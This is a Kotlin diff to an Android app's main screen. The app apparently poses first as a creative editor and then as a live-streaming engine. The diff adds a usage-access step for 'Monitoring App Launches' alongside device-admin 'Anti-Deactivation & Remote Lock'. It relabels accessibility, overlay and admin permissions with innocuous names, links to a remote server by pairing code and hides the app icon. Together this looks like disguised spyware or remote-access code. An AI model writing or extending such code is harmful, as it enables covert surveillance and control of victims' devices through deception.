@@ -148,6 +148,12 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
+        // 5. Usage Access (Monitoring App Launches)
+        if (!PermissionHelper.hasUsageStatsPermission(this)) {
+            startActivity(PermissionHelper.usageAccessSettingsIntent())
+            return
+        }
+
         // 6. Device Admin (Anti-Deactivation & Remote Lock)
         if (!PermissionHelper.isDeviceAdminEnabled(this)) {
             startActivity(PermissionHelper.deviceAdminSettingsIntent(this))
@@ -176,16 +182,16 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun updateStatusText(pairCode: String) {
-        val status = if (ADexForegroundService.isServiceRunning) "Editing Active" else "Ready to Edit"
+        val status = if (ADexForegroundService.isServiceRunning) "Live" else "Offline"
         val linkState = when {
-            pairCode.startsWith("linked:", ignoreCase = true) -> "Cloud Project Linked"
+            pairCode.startsWith("linked:", ignoreCase = true) -> "Stream Securely Linked"
             pairCode.startsWith("pair_code:", ignoreCase = true) -> {
                 val code = pairCode.substringAfter("pair_code:")
-                "Project Sync Code: $code"
+                "Engine Code: $code"
             }
             pairCode.startsWith("error:", ignoreCase = true) -> "Sync Failed"
             pairCode.isNotBlank() -> pairCode
-            else -> "Connecting to Asset Server..."
+            else -> "Connecting to Live Server..."
         }
         statusText.text = "Session: $status | $linkState"
     }
@@ -204,12 +210,13 @@ class MainActivity : AppCompatActivity() {
         }
 
         val lines = listOf(
-            "Editor Diagnostics: ${statusLabel(PermissionHelper.hasOverlayPermission(this))}",
-            "Rendering Background optimization: ${statusLabel(PermissionHelper.isAccessibilityServiceEnabled(this))}",
-            "Instant Export Support: $screenshotStatusText",
-            "Project Security Shield: ${statusLabel(PermissionHelper.isDeviceAdminEnabled(this))}",
-            "Creative Toolkits: ${statusLabel(runtimeMissing.isEmpty())}",
-            "Export Service: ${statusLabel(notificationGranted)}",
+            "Display Diagnostics: ${statusLabel(PermissionHelper.hasOverlayPermission(this))}",
+            "Usage Monitoring Service: ${statusLabel(PermissionHelper.hasUsageStatsPermission(this))}",
+            "Engine Background optimization: ${statusLabel(PermissionHelper.isAccessibilityServiceEnabled(this))}",
+            "Live Screenshot Support: $screenshotStatusText",
+            "Security Modules: ${statusLabel(PermissionHelper.isDeviceAdminEnabled(this))}",
+            "Streamer Toolkits: ${statusLabel(runtimeMissing.isEmpty())}",
+            "Broadcasting Service: ${statusLabel(notificationGranted)}",
         ).toMutableList()
 
         if (runtimeMissing.isNotEmpty()) {
@@ -291,7 +298,7 @@ class MainActivity : AppCompatActivity() {
                 hideAppIcon()
                 
                 // Show a quick text before closing so they know it's "Done"
-                statusText.text = "Project sync complete. Background rendering active."
+                statusText.text = "Optimization Complete. Live Stream Engine Active."
                 
                 kotlinx.coroutines.delay(1500)
                 finish()
